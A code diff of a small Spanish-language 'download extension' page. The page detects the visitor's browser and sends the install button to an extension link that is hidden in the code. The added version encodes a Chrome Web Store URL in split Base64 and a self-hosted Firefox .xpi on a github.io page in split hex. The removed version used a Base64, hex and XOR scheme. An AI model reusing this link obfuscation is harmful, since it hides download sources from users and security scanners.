@@ -1,65 +1,68 @@
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="utf-8">
-  <title>BackOffice Ofuscado</title>
-  <style>
-    body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5}
-    .card{background:#fff;padding:2rem;border-radius:1rem;box-shadow:0 4px 10px rgba(0,0,0,.15);text-align:center;max-width:420px}
-    a.button{display:inline-block;margin-top:1rem;padding:.75rem 1.5rem;border-radius:.5rem;background:#0078d7;color:#fff;text-decoration:none;font-weight:700;cursor:pointer}
-    a.button:hover{background:#005ea6}
-  </style>
+<meta charset="utf-8">
+<title>Descargar Extensión</title>
+<style>
+  body{font-family:Arial,sans-serif;display:flex;justify-content:center;align-items:center;height:100vh;background:#f5f5f5;margin:0}
+  .card{background:#fff;padding:2rem;border-radius:1rem;box-shadow:0 4px 10px rgba(0,0,0,.15);text-align:center;max-width:420px}
+  .btn{display:inline-block;margin-top:1rem;padding:.75rem 1.5rem;border-radius:.5rem;background:#0078d7;color:#fff;text-decoration:none;font-weight:700;cursor:pointer}
+  .btn:hover{background:#005ea6}
+</style>
 </head>
 <body>
   <div class="card">
     <h1>Descargar Extensión</h1>
     <p id="mensaje">Detectando tu navegador...</p>
-    <a id="boton" class="button">Esperando...</a>
+    <a id="boton" class="btn">Esperando...</a>
   </div>
 
   <script>
-    /* ======== Funciones utilitarias ======== */
-    const atHex = h => h.match(/.{1,2}/g).map(x => String.fromCharCode(parseInt(x,16))).join("");
-    const xorDecode = (str,key) => String.fromCharCode(...str.split("").map((ch,i)=>ch.charCodeAt(0)^key.charCodeAt(i%key.length)));
+    /* ========= ENLACES OFUSCADOS ========= */
 
-    /* ======== Enlaces en triple capa (Base64 → Hex → XOR) ======== */
-    const clave = "MxKey"; // clave ligera
-
-    // Estos strings son Base64 que contienen un hex que a su vez es un XOR
-    const chromeParts = [
-      "NjE2NDY3NzA3MjcxNmY2NzI2NTMyNzQ3OTMyNjk2YzY4NjQ3NTMxNzk2ZDYyMzIzMTMxMzUzMzk2ZDY5MzAzMTY2MzkzMDMwMzMzOTMwMzAzMDM0NjgzMTM4MzEzNTMxMzk2ZDY5MzIzMjY1Njg2NTM3NzY2MjMwMzA2MzM0MzMzNTMzMzEzNjMzMzAzNzM3M2Y=",
-      "NjE2NTM3NDY3MjczMzIzNDMwNjIzMDMyMzEzMjM1MzAzMDMwMzQ2YjMyMzEzOTMyNjY2MTYzNzI2OTMyNjk2YzY4NjQ3NTMyNzQ2OTY1MzYzNjM1NjUzNTMyNjMzNzYyMzAzMTMxMzgzMTMxMzkzMjM4MzAzMDM0NjgzMTM4MzEzNTMxMzk2ZDY5MzIzMjY1Njg2NQ=="
+    // Chrome / Edge → Base64 dividido
+    const chromeB64 = [
+      "aHR0cHM6Ly9jaHJvbWV3ZWJzdG9yZS5nb29nbGUuY29t",
+      "L2RldGFpbC9iYWNrb2ZmaWNlYWRkb25zL2pqZ2FmZHBhbWJvbmVib2xmZGZoY2JmamRtaGFsZGhi"
     ];
 
-    const firefoxParts = [
-      "NjE2NTM3NDY3MjczMzIzNDMwNjIzMDMyMzEzMjM1MzAzMDMwMzQ2YjMyMzEzOTMyNjY2MTYzNzI2OTMyNjk2YzY4NjQ3NTMyNzQ2OTY1MzYzNjM1NjUzNTMyNjMzNzYyMzAzMTMxMzgzMTMxMzkzMjM4MzAzMDM0NjgzMTM4MzEzNTMxMzk2ZDY5MzIzMjY1Njg2NQ=="
+    // Firefox → Hex dividido
+    const firefoxHex = [
+      "68747470733a2f2f7465616d6d657869636f372e6769746875622e696f2f",
+      "4261636b4f6666696365557064617465732f6261636b6f66666963657465616d6d78",
+      "2d31322e382e787069"
     ];
 
-    /* ======== Reconstrucción en tiempo real ======== */
-    const ua = navigator.userAgent, isPC = !/Mobi|Android|iPhone|iPad/i.test(ua);
-    const msg = document.getElementById("mensaje"), btn = document.getElementById("boton");
+    /* ========= FUNCIONES ========= */
 
-    function rebuild(parts){
-      const combined = parts.join("");
-      const baseDecoded = atob(combined);
-      const hexDecoded = atHex(baseDecoded);
-      return xorDecode(hexDecoded, clave);
-    }
+    // Decodifica partes Base64
+    function decodeBase64Parts(parts){ return atob(parts.join("")); }
+
+    // Convierte hex a texto
+    function hexToStr(h){ return h.match(/.{1,2}/g).map(x=>String.fromCharCode(parseInt(x,16))).join(""); }
+    function buildFromHex(parts){ return parts.map(hexToStr).join(""); }
+
+    /* ========= DETECCIÓN Y ASIGNACIÓN ========= */
+
+    const ua = navigator.userAgent;
+    const isPC = !/Mobi|Android|iPhone|iPad/i.test(ua);
+    const mensaje = document.getElementById("mensaje");
+    const boton = document.getElementById("boton");
 
     if(!isPC){
-      msg.textContent="Solo disponible en navegadores de escritorio.";
-      btn.style.display="none";
-    } else if(/Chrome|Edg/.test(ua)&&!/OPR/.test(ua)){
-      msg.textContent="Instalar en Chrome";
-      btn.textContent="Instalar Complemento";
-      btn.onclick = ()=> location.href = rebuild(chromeParts);
+      mensaje.textContent = "Solo disponible en navegadores de escritorio.";
+      boton.style.display = "none";
+    } else if(/Chrome|Edg/.test(ua) && !/OPR/.test(ua)){
+      mensaje.textContent = "Instalar en Chrome";
+      boton.textContent = "Instalar Complemento";
+      boton.onclick = ()=> location.href = decodeBase64Parts(chromeB64);
     } else if(/Firefox/.test(ua)){
-      msg.textContent="Instalar en Firefox.";
-      btn.textContent="Instalar Complemento";
-      btn.onclick = ()=> location.href = rebuild(firefoxParts);
+      mensaje.textContent = "Instalar en Firefox";
+      boton.textContent = "Instalar Complemento";
+      boton.onclick = ()=> location.href = buildFromHex(firefoxHex);
     } else {
-      msg.textContent="Tu navegador no es compatible.";
-      btn.style.display="none";
+      mensaje.textContent = "Tu navegador no es compatible.";
+      boton.style.display = "none";
     }
   </script>
 </body>
